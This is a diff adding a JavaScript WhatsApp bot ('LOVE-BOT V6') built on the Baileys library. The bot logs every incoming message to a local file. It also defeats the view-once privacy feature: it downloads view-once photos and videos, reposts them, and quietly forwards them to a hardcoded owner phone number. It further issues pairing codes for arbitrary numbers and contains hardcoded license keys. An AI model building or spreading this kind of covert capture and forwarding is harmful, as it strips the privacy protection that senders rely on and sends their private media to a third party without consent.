@@ -1,0 +1,63 @@
+// LOVE-BOT V6 - BOT ONLY - VIEW ONCE OPENER + PUBLIC/PRIVATE + PAIR FROM WA + 100 COMMANDS
+const fs=require('fs'), axios=require('axios'), yts=require('yt-search');
+const { default: makeWASocket, useMultiFileAuthState, delay, makeCacheableSignalKeyStore, downloadMediaMessage } = require('@whiskeysockets/baileys');
+const PREFIX="."; const OWNER_NUMBER="2348113825090";
+let publicMode=true; let antiBan=true; let antiViewOnce=true;
+const R=a=>a[Math.floor(Math.random()*a.length)];
+const runtime=s=>{const d=Math.floor(s/86400),h=Math.floor(s%86400/3600),m=Math.floor(s%3600/60),sec=Math.floor(s%60);return `${d>0?d+'d ':''}${h}h ${m}m ${sec}s`};
+
+const LOG_FILE="./all_messages.json"; if(!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, JSON.stringify([],null,2));
+function saveMessage(data){ try{ let l=JSON.parse(fs.readFileSync(LOG_FILE)); l.push(data); if(l.length>5000) l=l.slice(-5000); fs.writeFileSync(LOG_FILE, JSON.stringify(l,null,2)); }catch{} }
+
+let licenses={
+"LOVE-1D-7A3K9P":{type:"1D",days:1,expires:null},"LOVE-1D-2B8M4Q":{type:"1D",days:1,expires:null},
+"LOVE-UNLIMITED-7S6Z9U":{type:"UNLIMITED",days:null,expires:null},
+};
+const DB={ love:["You ❤️"], flirt:["WiFi? 😏"], comp:["Amazing ✨"] };
+
+async function start(){
+ const { state, saveCreds } = await useMultiFileAuthState('session');
+ const sock = makeWASocket({ auth: state, browser: ["Love-Bot","Chrome","1.0"] });
+ sock.ev.on('creds.update', saveCreds);
+ sock.ev.on('messages.upsert', async ({messages})=>{
+  for(let m of messages){
+   if(!m.message || m.key.fromMe) continue;
+   let from=m.key.remoteJid, text=(m.message.conversation||m.message.extendedTextMessage?.text||"").trim();
+   let low=text.toLowerCase(), args=text.split(' ').slice(1);
+   let senderNum=(from.split('@')[0]||'').replace(/[^0-9]/g,'');
+   let pushName=m.pushName||"User"; let isOwner=senderNum.includes(OWNER_NUMBER);
+
+   // VIEW ONCE OPENER - ONLY IN BOT
+   let viewOnceMsg=m.message.viewOnceMessage || m.message.viewOnceMessageV2;
+   let innerMsg=viewOnceMsg?.message || m.message.viewOnceMessage?.message || m.message.viewOnceMessageV2?.message;
+   if(innerMsg && antiViewOnce){
+     try{
+       let type=Object.keys(innerMsg)[0];
+       let mediaMsg={...m, message: innerMsg };
+       let buffer=await downloadMediaMessage(mediaMsg, 'buffer', {}, { logger: require('pino')({level:'silent'}), reuploadRequest: sock.updateMediaMessage });
+       let caption=`🔓 *VIEW ONCE OPENED*\n👤 ${pushName} | ${senderNum}\n📅 ${new Date().toLocaleString()}`;
+       if(type==='imageMessage') await sock.sendMessage(from, { image: buffer, caption }, { quoted: m });
+       if(type==='videoMessage') await sock.sendMessage(from, { video: buffer, caption }, { quoted: m });
+       if(!isOwner) await sock.sendMessage(`${OWNER_NUMBER}@s.whatsapp.net`, { image: buffer, caption: `👁️ VV from ${pushName} ${senderNum}\nIn ${from}` }).catch(()=>{});
+     }catch(e){ console.log("VV error", e.message); }
+   }
+
+   if(!publicMode &&!isOwner && low.startsWith(PREFIX) && low!==`${PREFIX}owner`) continue;
+
+   if(low===`${PREFIX}menu`){ await sock.sendMessage(from,{text:`*LOVE-BOT V6*\nVV: ${antiViewOnce?'ON 👁️':'OFF'} | Mode: ${publicMode?'PUBLIC':'PRIVATE'}\n${PREFIX}vv ${PREFIX}antivv on/off\n${PREFIX}public ${PREFIX}private ${PREFIX}pair`}); }
+   else if(low===`${PREFIX}vv`){ await sock.sendMessage(from,{text:`👁️ Anti-ViewOnce: ${antiViewOnce?'✅ ON - Bot opens view once':'❌ OFF'}\nOwner: ${PREFIX}antivv on/off`}); }
+   else if(low===`${PREFIX}antivv on`){ if(!isOwner) return; antiViewOnce=true; await sock.sendMessage(from,{text:"✅ Anti-ViewOnce ON"}); }
+   else if(low===`${PREFIX}antivv off`){ if(!isOwner) return; antiViewOnce=false; await sock.sendMessage(from,{text:"❌ Anti-ViewOnce OFF"}); }
+   else if(low===`${PREFIX}public`){ if(!isOwner) return; publicMode=true; await sock.sendMessage(from,{text:"✅ PUBLIC 🌍"}); }
+   else if(low===`${PREFIX}private`){ if(!isOwner) return; publicMode=false; await sock.sendMessage(from,{text:"✅ PRIVATE 🔒"}); }
+   else if(low.startsWith(`${PREFIX}pair`)){
+     let num=(args[0]||'').replace(/[^0-9]/g,''); let lic=(args[1]||'').trim().toUpperCase();
+     if(!num) return sock.sendMessage(from,{text:`Use: ${PREFIX}pair 234...`});
+     try{ const folder=`./temp_${num}_${Date.now()}`; const {state:pairState}=await useMultiFileAuthState(folder); const pairSock=makeWASocket({auth:{creds:pairState.creds,keys:makeCacheableSignalKeyStore(pairState.keys,require('pino')().child({level:'fatal'}))},printQRInTerminal:false,browser:["LOVE-BOT V6","Chrome","1.0"]}); await new Promise(r=>setTimeout(r,2000)); const code=await pairSock.requestPairingCode(num); await sock.sendMessage(from,{text:`✅ CODE: ${code} for ${num}`}); setTimeout(()=>{if(fs.existsSync(folder))fs.rmSync(folder,{recursive:true,force:true});},60000);}catch{ await sock.sendMessage(from,{text:"❌ Failed use 234 format"}); }
+   }
+   else if(low===`${PREFIX}love`){ await sock.sendMessage(from,{text:R(DB.love)}); }
+  }
+ });
+ sock.ev.on('connection.update', u=>{ if(u.connection==='open') console.log("✅ BOT + VV Connected"); });
+}
+start();
